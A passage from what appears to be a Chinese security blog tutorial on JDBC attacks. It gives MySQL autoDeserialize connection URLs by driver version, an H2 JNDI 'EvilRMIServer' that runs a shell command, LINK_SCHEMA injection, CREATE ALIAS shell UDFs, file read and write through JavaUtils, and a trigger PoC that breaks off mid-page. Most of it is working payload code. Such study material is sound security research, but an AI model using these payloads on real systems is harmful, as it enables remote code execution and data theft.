alt="image-20240813174917368"></p><p>çœ‹åˆ°æ‰§è¡Œäº†<code>SHOW SESSION STATUS</code>ï¼Œå¹¶å°†ç»“æœï¼ˆ<code>com.mysql.cj.jdbc.result.ResultSetImpl</code>ï¼‰ä¼ å…¥<code>ResultSetUtil#resultSetToMap</code>è¿›è¡Œååºåˆ—åŒ–å¤„ç†ï¼š</p><p><img src="/2024/08/13/JDBC/image-20240813175009305.png" alt="image-20240813175009305"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resultSetToMap</span><span class="hljs-params">(Map mappedValues, ResultSet rs)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-keyword">while</span> (rs.next()) &#123;<br>        mappedValues.put(rs.getObject(<span class="hljs-number">1</span>), rs.getObject(<span class="hljs-number">2</span>));<br>    &#125;<br>&#125;<br><span class="hljs-comment">// getObject(2)</span><br><span class="hljs-keyword">if</span> (field.isBinary() || field.isBlob()) &#123;<br>    <span class="hljs-type">byte</span>[] data = getBytes(columnIndex);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>getObject</code>åˆ¤æ–­MySQLç±»å‹ä¸ºBLOBåï¼Œä»MySQLæœåŠ¡ç«¯è·å–å¯¹åº”çš„å­—èŠ‚ç æ•°æ®</p><p>ä»MySQLæœåŠ¡ç«¯è·å–åˆ°å­—èŠ‚ç æ•°æ®åï¼Œåˆ¤æ–­<code>autoDeserialize</code>æ˜¯å¦ä¸ºtrueï¼ˆè¿æ¥URLä¸­è®¾ç½®äº†<code>autoDeserialize=true</code>ï¼‰ã€å­—èŠ‚ç æ•°æ®æ˜¯å¦ä¸ºåºåˆ—åŒ–å¯¹è±¡ï¼ˆå‰ä¸¤ä¸ªå­—èŠ‚ä¸º<code>-84</code>å’Œ<code>-19</code>æ ‡è¯†åºåˆ—åŒ–å¯¹è±¡ï¼‰ç­‰ï¼Œæœ€åè°ƒç”¨<code>readObject</code>è§¦å‘ååºåˆ—åŒ–æ¼æ´</p><p><img src="/2024/08/13/JDBC/image-20240813175118532.png" alt="image-20240813175118532"></p><p><img src="/2024/08/13/JDBC/image-20240813175141320.png" alt="image-20240813175141320"></p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p><code>ServerStatusDiffInterceptor</code>è§¦å‘ã€‚</p><h4 id="8-x"><a href="#8-x" class="headerlink" title="8.x&lt;&#x3D;8.0.20"></a>8.x&lt;&#x3D;8.0.20</h4><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h4><p><code>queryInterceptors</code>æ”¹å<code>statementInterceptors</code></p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="5-1-11"><a href="#5-1-11" class="headerlink" title="&gt;&#x3D;5.1.11"></a>&gt;&#x3D;5.1.11</h4><p>åŒ…åä¸å«<code>cj</code></p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="5-x"><a href="#5-x" class="headerlink" title="5.x&lt;&#x3D;5.1.10"></a>5.x&lt;&#x3D;5.1.10</h4><p>åŒä¸Šï¼Œéœ€è¦è¿æ¥åæ‰§è¡ŒæŸ¥è¯¢</p><h3 id="detectCustomCollationsè§¦å‘"><a href="#detectCustomCollationsè§¦å‘" class="headerlink" title="detectCustomCollationsè§¦å‘"></a><code>detectCustomCollations</code>è§¦å‘</h3><h4 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29~5.1.40"></a>5.1.29~5.1.40</h4><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true</span><br></code></pre></td></tr></table></figure></blockquote><h4 id="5-1-19-5-1-28"><a href="#5-1-19-5-1-28" class="headerlink" title="5.1.19~5.1.28"></a>5.1.19~5.1.28</h4><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">jdbc:mysql:<span class="hljs-comment">//127.0.0.1:3306/test?autoDeserialize=true</span><br></code></pre></td></tr></table></figure></blockquote><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/jdbc-attack/mysql">MySQL JDBC Attack | Java (gitbook.io)</a></p><p>[MySQL JDBCååºåˆ—åŒ–æ¼æ´ <a href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"> Mi1k7ea ]</a></p><p><a href="https://www.anquanke.com/post/id/203086">MySQL JDBC å®¢æˆ·ç«¯ååºåˆ—åŒ–æ¼æ´åˆ†æ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><h2 id="H2-JDBC"><a href="#H2-JDBC" class="headerlink" title="H2-JDBC"></a>H2-JDBC</h2><p>ä¹Ÿæ›¾åœ¨HGAMEçš„æ–°ç”Ÿèµ›ä¸Šè§åˆ°äº†H2æ•°æ®åº“çš„SQLæ³¨å…¥&#x3D;&gt;RCEæ¼æ´ï¼Œè€Œä¸”è¯¾å†…æ•°æ®åº“å¼€å‘æˆ‘ä¹Ÿæ˜¯ç”¨çš„H2æ•°æ®åº“äº¤äº†ä¸€æ¬¡ä½œä¸šhhhï¼Œæ‰€ä»¥å°è±¡è¿˜æ˜¯æ¯”è¾ƒæ·±ã€‚</p><p>JDBCæ˜¯JDKæä¾›çš„ä¸€ä¸ªç”¨äºè¿æ¥æ•°æ®åº“çš„æ¥å£(Java DataBase Connectivity)ï¼Œå„ä¸ªæ•°æ®åº“å‚å•†(MySQLã€Oracleã€SQLServer)è´Ÿè´£ç¼–å†™è‡ªå·±çš„JDBCå®ç°ç±»ï¼Œå†æŠŠè¿™äº›å®ç°ç±»æ‰“åŒ…ä¸ºé©±åŠ¨jaråŒ…ï¼Œæˆ‘ä»¬ä½¿ç”¨JDBCçš„æ¥å£ç¼–ç¨‹ï¼ŒèƒŒåè°ƒç”¨çš„å®åˆ™æ˜¯å®ç°ç±»é‡Œçš„æ–¹æ³•ã€‚</p><p>å¸¸è§çš„JDBCä½¿ç”¨æ–¹æ³•æ˜¯åœ¨é…ç½®æ–‡ä»¶ä¸­å†™å¥½JDBCå¼•æ“ã€è¿æ¥æ•°æ®åº“çš„URLã€è´¦æˆ·ã€å¯†ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>;  <span class="hljs-comment">//testæ•°æ®åº“</span><br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_USER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_PASSWORD</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;password&quot;</span>;<br><span class="hljs-comment">// å»ºç«‹è¿æ¥</span><br><span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(JDBC_URL, JDBC_USER,<br>JDBC_PASSWORD);<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> è®¿é—®æ•°æ®åº“</span><br><span class="hljs-comment">// å…³é—­è¿æ¥</span><br>conn.close();<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆJDBCè¿æ¥çš„URLæ€ä¹ˆèƒ½å¤Ÿè®©ç”¨æˆ·æ§åˆ¶å¾—åˆ°å‘¢ï¼Ÿå®é™…åœ¨ä¸€äº›åœºæ™¯æˆ–è€…æ¸—é€æµ‹è¯•é‡Œï¼Œæ¯”å¦‚åå°ä¿®æ”¹æ•°æ®åº“é…ç½®ã€æµ‹è¯•æ•°æ®åº“è¿æ¥ä¸­ï¼Œç®¡ç†å‘˜å°±å¯ä»¥æ§åˆ¶JDBCçš„è¿æ¥URLã€‚</p><p>å› æ­¤è¿™ç±»æ¼æ´ä¸»è¦æ˜¯åœ¨åå°ç®¡ç†(å½“ç„¶ç¬¬ä¸€æ­¥å¾—æ”»è¿›åå°ï¼Œæœªæˆæƒã€å¼±å¯†é’¥ã€é€»è¾‘æ¼æ´ç­‰ç­‰ç­‰)ã€‚</p><p>æ­¤å¤„ä»‹ç»h2 databaseçš„ç›¸å…³æ¼æ´ã€‚</p><p>H2æ˜¯ä¸€ä¸ªç”¨Javaç¼–å†™çš„æ•°æ®åº“ï¼Œæ”¯æŒå†…å­˜(æœ‰ç‚¹åƒsqlite)ã€æ–‡ä»¶ç­‰æ¨¡å¼ï¼Œåªæœ‰ä¸€ä¸ªjaræ–‡ä»¶ï¼Œé€‚åˆä½œä¸ºåµŒå…¥å¼æ•°æ®åº“ä½¿ç”¨ã€‚ä¸»è¦ç”¨äºå•å…ƒæµ‹è¯•ã€‚H2æä¾›äº†ä¸€ä¸ªwebæ§åˆ¶å°ç”¨äºæ“ä½œå’Œç®¡ç†æ•°æ®åº“ã€‚</p><h3 id="H2è¿æ¥"><a href="#H2è¿æ¥" class="headerlink" title="H2è¿æ¥"></a>H2è¿æ¥</h3><p>ä¸€èˆ¬æˆ‘ä»¬ä¼šç”¨SpringBootæ¥æ•´åˆH2ã€‚</p><p>h2 database consoleå¯ä»¥æ•´åˆåˆ°SpringBootä¸­ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹å¯åŠ¨(å…¶å†…ç½®äº†ä¸€ä¸ªWebServer)</p><p>H2æ”¯æŒè¿è¡Œä¸‰ç§æ¨¡å¼ï¼š</p><p>Embedded(åµŒå…¥å¼)-&gt;æ— éœ€é…ç½®æœ¬åœ°&#x2F;è¿œç¨‹æ•°æ®åº“; æ•°æ®åº“è¿æ¥å…³é—­æ—¶, æ•°æ®ä¸è¡¨ç»“æ„ä¾ç„¶å­˜åœ¨;</p><p>In-Memory(å†…å­˜æ¨¡å¼)-&gt;æ— éœ€é…ç½®æœ¬åœ°&#x2F;è¿œç¨‹æ•°æ®åº“, ä½†æ•°æ®åº“è¿æ¥å…³é—­æ—¶ï¼Œæ•°æ®ä¸è¡¨ç»“æ„ä¸¢å¤±;</p><p>ServerMode(ä¼ ç»Ÿæ¨¡å¼)-&gt;éœ€è¦é…ç½®æœ¬åœ°&#x2F;è¿œç¨‹æ•°æ®åº“;</p><h4 id="jarå¯åŠ¨"><a href="#jarå¯åŠ¨" class="headerlink" title="jarå¯åŠ¨"></a>jarå¯åŠ¨</h4><p>è¿™é‡Œçœä¸ªäº‹æŠ„äº†ã€‚å®é™…ä¸ŠæŠŠh2æŒ‚åœ¨ä¾èµ–é‡Œï¼Œå¯åŠ¨é¡¹ç›®å°±èƒ½å¯åŠ¨H2ã€‚</p><p>åœ¨<a href="http://www.h2database.com/html/cheatSheet.html">å®˜ç½‘</a>ä¸‹è½½jaråŒ…ï¼Œè°ƒç”¨é‡Œé¢çš„<code>org.h2.tools.Server</code>ç±»</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">java <span class="hljs-literal">-cp</span> .\h2<span class="hljs-literal">-2</span>.<span class="hljs-number">2.220</span>.jar org.h2.tools.Server <span class="hljs-literal">-help</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/13/JDBC/image-20240813175959888.png" alt="image-20240813175959888"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">java <span class="hljs-literal">-cp</span> .\h2<span class="hljs-literal">-2</span>.<span class="hljs-number">2.220</span>.jar org.h2.tools.Server <span class="hljs-literal">-web</span> <span class="hljs-literal">-webAllowOthers</span><br></code></pre></td></tr></table></figure><p>å¯åŠ¨Web consoleï¼Œé»˜è®¤ç›‘å¬8082ç«¯å£</p><p>H2çš„Web consoleä¸ä»…å¯ä»¥è¿æ¥H2æ•°æ®åº“ï¼Œä¹Ÿå¯ä»¥è¿æ¥å…¶ä»–æ”¯æŒJDBC APIçš„æ•°æ®åº“</p><p><img src="/2024/08/13/JDBC/image-20240813180049784.png" alt="image-20240813180049784"></p><p>H2æ•°æ®åº“é»˜è®¤ç”¨æˆ·åä¸ºsaã€å¯†ç ä¸ºç©ºï¼š</p><p><img src="/2024/08/13/JDBC/image-20240813180102966.png" alt="image-20240813180102966"></p><h4 id="SpringBootæ•´åˆ"><a href="#SpringBootæ•´åˆ" class="headerlink" title="SpringBootæ•´åˆ"></a>SpringBootæ•´åˆ</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.h2database<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>h2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨<code>application.properties</code>ä¸­æ·»åŠ h2è¿æ¥çš„é…ç½®</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.datasource.driver-class-name</span>=<span class="hljs-string">org.h2.Driver</span><br><span class="hljs-attr">spring.datasource.url</span>=<span class="hljs-string">jdbc:h2:mem:test</span><br><span class="hljs-attr">spring.datasource.username</span>=<span class="hljs-string">sa</span><br><span class="hljs-attr">spring.datasource.password</span>=<span class="hljs-string"></span><br><br><span class="hljs-attr">spring.h2.console.enabled</span>=<span class="hljs-string">true</span><br><span class="hljs-attr">spring.h2.console.path</span>=<span class="hljs-string">/h2</span><br><span class="hljs-attr">spring.h2.console.settings.trace</span>=<span class="hljs-string">false</span><br><span class="hljs-attr">spring.h2.console.settings.web-allow-others</span>=<span class="hljs-string">true</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œspringbootå¯ä»¥ä¿®æ”¹h2 consoleçš„è®¿é—®è·¯å¾„ï¼Œè‹¥æœªé…ç½®æ­¤é¡¹é»˜è®¤ä¸º<code>h2-console</code></p><p>demoå°±å…äº†ï¼Œç½‘ä¸Šä¸€å¤§æŠŠã€‚</p><h3 id="H2-JNDI"><a href="#H2-JNDI" class="headerlink" title="H2-JNDI"></a>H2-JNDI</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilRMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8025</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;touch /tmp/h2-jndi-success&#x27;]).start()\&quot;)&quot;</span>));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>        System.out.println(<span class="hljs-string">&quot;running&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨BeanFactoryæœ¬åœ°å·¥å‚ç±»å®ç°çš„JNDIï¼ŒH2æ˜¯æ”¯æŒçš„ã€‚</p><p><img src="/2024/08/13/JDBC/image-20240813180357092.png" alt="image-20240813180357092"></p><p>é«˜ç‰ˆæœ¬çš„H2åªå…è®¸JNDI lookupçš„URLä»¥javaå¼€å¤´ï¼š</p><p><img src="/2024/08/13/JDBC/image-20240813180414155.png" alt="image-20240813180414155"></p><p>è€Œåœ¨H2çš„å‡½æ•°æ–‡æ¡£ä¸­èƒ½å‘ç°ä¸€å¤„å¯èƒ½é€ æˆJNDIæ³¨å…¥çš„ï¼š<code>LINK_SCHEMA</code></p><p><a href="http://www.h2database.com/html/functions.html#link_schema">http://www.h2database.com/html/functions.html#link_schema</a></p><p><img src="/2024/08/13/JDBC/image-20240813180443447.png" alt="image-20240813180443447"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> LINK_SCHEMA(<span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;javax.naming.InitialContext&#x27;</span>, <span class="hljs-string">&#x27;rmi://127.0.0.1:8025/evil&#x27;</span>, <span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;EddieMurphy&#x27;</span>, <span class="hljs-string">&#x27;PUBLIC&#x27;</span>);<br></code></pre></td></tr></table></figure><p>åŒæ ·é«˜ç‰ˆæœ¬å¯¹URLè¿›è¡Œäº†é™åˆ¶ï¼Œåªå…è®¸javaå¼€å¤´</p><h3 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2-RCE"></a>H2-RCE</h3><h4 id="UDFæ‰§è¡Œ"><a href="#UDFæ‰§è¡Œ" class="headerlink" title="UDFæ‰§è¡Œ"></a>UDFæ‰§è¡Œ</h4><ul><li><code>CREATE ALIAS</code></li></ul><p>è‡ªå®šä¹‰å‡½æ•°</p><p>åˆ›å»ºä¸€ä¸ªshellå‡½æ•°å¹¶è°ƒç”¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> ALIAS IF <span class="hljs-keyword">EXISTS</span> shell;<br><span class="hljs-keyword">CREATE</span> ALIAS shell <span class="hljs-keyword">AS</span> $$void shell(String s) throws Exception &#123;<br>java.lang.Runtime.getRuntime().<span class="hljs-keyword">exec</span>(s);<br>&#125;$$;<br><span class="hljs-keyword">SELECT</span> shell(<span class="hljs-string">&#x27;cmd /c calc&#x27;</span>);<br></code></pre></td></tr></table></figure><p>h2ä¸­ä¸¤ä¸ª<code>$</code>è¡¨ç¤ºæ— éœ€è½¬ä¹‰çš„é•¿å­—ç¬¦ä¸²</p><p>å¯¹æ¯”é«˜ç‰ˆæœ¬çš„H2ï¼Œ<code>handleSyntaxError</code>å¤šä¼ äº†ä¸€ä¸ªå‚æ•°ï¼Œè‹¥ç¬¬äºŒä¸ªå‚æ•°æ˜¯0åˆ™ç›´æ¥è¿”å›ï¼Œä¸è¿›è¡Œè¯­æ³•é”™è¯¯å¤„ç†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">handleSyntaxError*(output, (ok? <span class="hljs-number">0</span>: <span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p>é‚£å¦‚æœé‡ä¸Šç›®æ ‡ç”¨äº†lombokè¿˜æ˜¯H2ä½ç‰ˆæœ¬å‘¢?åªèƒ½è€ƒè™‘è°ƒç”¨ç›®æ ‡æœ¬åœ°çš„é™æ€å…¬å¼€æ–¹æ³•</p><p>å¦‚<code>com.sun.org.apache.xml.internal.security.utils.JavaUtils</code>æœ‰ä¸¤ä¸ªè¯»å†™æ–‡ä»¶çš„é™æ€å…¬å¼€æ–¹æ³•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS read <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;com.sun.org.apache.xml.internal.security.utils.JavaUtils.getBytesFromFile&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> read(<span class="hljs-string">&#x27;E:/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><p>è¯»å‡ºæ¥çš„ç»“æœä¸ºbyteæ•°ç»„ï¼Œè¿˜å¾—è½¬ä¸ºå­—ç¬¦ä¸²</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = &#123;<span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>&#125;;<br>System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes));  <span class="hljs-comment">// æ‰“å°here is my flag</span><br></code></pre></td></tr></table></figure><p>è™½ç„¶<code>writeBytesToFilename</code>ç¬¬äºŒä¸ªå‚æ•°è¦æ±‚ä¸ºbyteæ•°ç»„ï¼Œä½†ä¼ å­—ç¬¦ä¸²ä¹Ÿè¡Œï¼ŒH2èƒ½å¤Ÿè‡ªåŠ¨è½¬æ¢ã€‚æˆ–è€…åœ¨åå…­è¿›åˆ¶å­—ç¬¦ä¸²å‰é¢åŠ ä¸ªXã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS write <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> write(<span class="hljs-string">&#x27;E:/success.txt&#x27;</span>, <span class="hljs-string">&#x27;Arbitrary File Write&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> write(<span class="hljs-string">&#x27;E:/wirte_hex.txt&#x27;</span>, X<span class="hljs-string">&#x27;68657265206973206d7920666c6167&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å½“ç„¶è¿˜æœ‰å…¶ä»–é™æ€æ–¹æ³•å¯ä»¥åˆ©ç”¨ï¼Œæ¯”å¦‚</p><ul><li><code>java.sql.DriverManager#getConnection</code> è¿æ¥æ¶æ„MySQLæœåŠ¡å™¨</li><li><code>javax.naming.InitialContext#doLookup</code> JNDIæ³¨å…¥</li><li><code>com.alibaba.fastjson.JSON#parseObject</code> FastJsonååºåˆ—åŒ–</li><li><code>org.springframework.util.SerializationUtils.deserialize</code> äºŒæ¬¡ååºåˆ—åŒ–</li></ul><h4 id="jsæ‰§è¡Œ"><a href="#jsæ‰§è¡Œ" class="headerlink" title="jsæ‰§è¡Œ"></a>jsæ‰§è¡Œ</h4><ul><li><code>CREATE TRIGGER</code></li></ul><p>è¿™ä¸ªå‘½ä»¤ç¨å¾®éº»çƒ¦ä¸€ç‚¹ï¼Œåˆ©ç”¨çš„æ˜¯è§¦å‘å™¨ï¼Œå³å¢åˆ æ”¹æ—¶ä¼šè§¦å‘ä¸€äº›åŠ¨ä½œï¼Œéœ€è¦æ–°å»ºä¸€å¼ è¡¨ï¼Œæˆ–è€…éœ€è¦æœ‰å·²çŸ¥è¡¨ã€‚</p><p>ä¸‹é¢ä¸Šç½‘ä¸Šæµä¼ çš„pocï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> hack (<br>     id <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span><br>);<br><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TRIGGER</span> TRIG_JS AFTER <span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">ON</span> hack <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;//javascript</span><br><span 